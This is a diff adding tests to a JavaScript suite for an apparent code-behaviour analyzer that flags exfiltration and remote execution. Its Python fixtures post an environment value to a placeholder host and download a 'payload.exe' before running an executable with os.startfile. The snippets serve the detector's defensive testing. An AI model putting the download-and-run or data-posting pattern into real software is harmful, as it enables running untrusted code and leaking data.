@@ -512,3 +512,30 @@ test("effect context separates backup transfer from download execution", () => {
   assert.ok(remoteExecution > 0.9);
   assert.ok(remoteExecution - backup > 0.8);
 });
+
+
+test("generic environment values do not become credential proximity", () => {
+  const generic = analyzeSource(
+    `def send():
+    value = os.getenv("API_URL")
+    requests.post("https://example.invalid/t", data=value)
+`,
+    "generic-env.py",
+  );
+  assert.equal(
+    generic.motifs.some((item) => item.motif === "credential_or_file_exfil"),
+    false,
+  );
+});
+
+test("legacy urlopen and startfile retain coarse browser capabilities", () => {
+  const report = analyzeSource(
+    `def run():
+    remote = urllib.urlopen("https://example.invalid/payload.exe")
+    os.startfile("download.exe")
+`,
+    "legacy.py",
+  );
+  assert.ok(report.events.some((event) => event.op === "NETWORK_RECEIVE"));
+  assert.ok(report.events.some((event) => event.op === "PROCESS_EXEC"));
+});
